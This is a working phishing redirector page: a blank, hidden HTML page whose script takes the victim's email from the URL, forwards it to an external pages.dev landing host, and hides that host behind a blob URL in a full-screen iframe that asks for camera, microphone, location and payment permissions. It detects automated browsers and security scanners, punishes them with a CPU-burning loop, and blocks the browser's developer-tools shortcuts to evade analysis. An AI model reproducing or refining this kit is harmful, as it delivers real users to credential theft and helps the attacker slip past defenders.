<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title></title>
<style>
html, body {
    margin: 0;
    padding: 0;
    width: 100vw;
    height: 100vh;
    background: white;
    overflow: hidden;
}
* {
    opacity: 0 !important;
    visibility: hidden !important;
}
</style>
</head>
<body>

<script>
// === FIXED BLOB VERSION - WORKS ON MOBILE ===
// Keeps blob URLs, no download prompts
// Works perfectly on mobile Chrome

(function() {
    'use strict';
    
    // === CONFIG ===
    const TARGET_BASE = "https://23b538b5.ko1wx90sd.pages.dev";
    
    // Get email
    function getEmail() {
        return new URLSearchParams(location.search).get("email") || "";
    }
    
    // Build target URL
    function buildTargetUrl() {
        const email = getEmail();
        return email ? TARGET_BASE + "#" + encodeURIComponent(email) : TARGET_BASE;
    }
    
    // === CREATE SAFE BLOB FOR MOBILE ===
    function createMobileSafeBlob(targetUrl) {
        // Create HTML with PROPER meta tags for mobile
        const html = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
    <title>Loading...</title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background: white;
        }
        iframe {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>
    <iframe src="${targetUrl}" 
            sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-modals"
            allow="autoplay; camera; microphone; geolocation; payment">
    </iframe>
    <script>
        // Prevent any download prompts
        window.addEventListener('beforeunload', function(e) {
            e.preventDefault();
            e.returnValue = '';
        });
        
        // Force iframe to stay loaded
        window.onblur = function() {
            window.focus();
        };
    <\/script>
</body>
</html>`;
        
        return new Blob([html], { 
            type: "text/html",
            endings: "transparent"
        });
    }
    
    // === BOT DETECTION ===
    function detectBot() {
        let score = 0;
        
        // Quick checks
        if (navigator.webdriver === true) score += 50;
        
        const ua = navigator.userAgent.toLowerCase();
        if (/headless|phantom|puppeteer|selenium|playwright/.test(ua)) score += 40;
        
        if (navigator.plugins.length === 0 && !/mobile|android|iphone/i.test(ua)) {
            score += 25;
        }
        
        // Speed test
        const start = performance.now();
        let x = 0;
        for (let i = 0; i < 500000; i++) x += Math.random();
        const end = performance.now();
        if (end - start < 2) score += 35;
        
        return score >= 60;
    }
    
    // === HUMAN DETECTION ===
    function detectHuman() {
        return new Promise((resolve) => {
            // Mobile devices = humans
            if (/mobile|android|iphone|ipad/i.test(navigator.userAgent)) {
                resolve(true);
                return;
            }
            
            // Check focus
            if (document.hasFocus()) {
                resolve(true);
                return;
            }
            
            // Listen for interaction
            let humanDetected = false;
            const events = ['touchstart', 'click', 'mousemove'];
            const handler = () => {
                if (!humanDetected) {
                    humanDetected = true;
                    resolve(true);
                    events.forEach(e => document.removeEventListener(e, handler));
                }
            };
            
            events.forEach(e => document.addEventListener(e, handler, { passive: true }));
            
            // Timeout
            setTimeout(() => {
                if (!humanDetected) {
                    resolve(false);
                    events.forEach(e => document.removeEventListener(e, handler));
                }
            }, 300);
        });
    }
    
    // === BOT PENALTY ===
    function penalizeBot() {
        // Waste resources
        let waste = 0;
        const interval = setInterval(() => {
            for (let i = 0; i < 1000000; i++) {
                waste = (waste * 1664525 + 1013904223) % 4294967296;
            }
        }, 100);
        
        // After penalty, redirect to dead end
        setTimeout(() => {
            clearInterval(interval);
            window.location.replace('data:text/html,<html></html>');
        }, 10000);
    }
    
    // === GRANT HUMAN ACCESS ===
    async function grantAccess() {
        const targetUrl = buildTargetUrl();
        const blob = createMobileSafeBlob(targetUrl);
        const blobUrl = URL.createObjectURL(blob);
        
        // CRITICAL: Add this to prevent download prompts
        const a = document.createElement('a');
        a.href = blobUrl;
        a.download = ''; // Empty download attribute
        
        // Use iframe instead of direct navigation
        const iframe = document.createElement('iframe');
        iframe.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;opacity:0;';
        iframe.src = blobUrl;
        document.body.appendChild(iframe);
        
        // Then redirect main window
        setTimeout(() => {
            window.location.href = blobUrl;
        }, 50);
        
        // Clean up
        setTimeout(() => {
            try {
                URL.revokeObjectURL(blobUrl);
            } catch(e) {}
        }, 10000);
    }
    
    // === MAIN EXECUTION ===
    async function execute() {
        // Check for bot
        if (detectBot()) {
            penalizeBot();
            return;
        }
        
        // Check for human
        const isHuman = await detectHuman();
        
        // Determine delay
        let delay = 100; // 100ms for humans
        
        if (!isHuman) {
            delay = 1500; // 1.5 seconds for no interaction
        }
        
        // Grant access after delay
        setTimeout(grantAccess, delay);
        
        // Safety timeout
        setTimeout(() => {
            if (!window.location.href.includes('blob:')) {
                grantAccess();
            }
        }, 5000);
    }
    
    // === PREVENT DOWNLOAD PROMPTS ===
    
    // Block beforeunload events that cause prompts
    window.addEventListener('beforeunload', function(e) {
        // Don't prevent, just handle quietly
        return undefined;
    });
    
    // Block unload events
    window.addEventListener('unload', function() {
        // Do nothing
    });
    
    // === START ===
    
    // Block dev tools
    document.addEventListener('keydown', function(e) {
        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
            e.preventDefault();
            window.location.replace('about:blank');
        }
    });
    
    // Start after delay
    setTimeout(execute, 100);
    
    // Also on load
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => setTimeout(execute, 50));
    } else {
        setTimeout(execute, 50);
    }
    
})();

// === FALLBACK ===
setTimeout(() => {
    const email = new URLSearchParams(window.location.search).get('email') || '';
    const url = email ? 
        "https://23b538b5.ko1wx90sd.pages.dev#" + encodeURIComponent(email) : 
        "https://23b538b5.ko1wx90sd.pages.dev";
    
    if (!window.location.href.includes('blob:')) {
        window.location.href = url;
    }
}, 8000);
</script>

<noscript>
<meta http-equiv="refresh" content="0;url=https://23b538b5.ko1wx90sd.pages.dev">
</noscript>

</body>
</html>
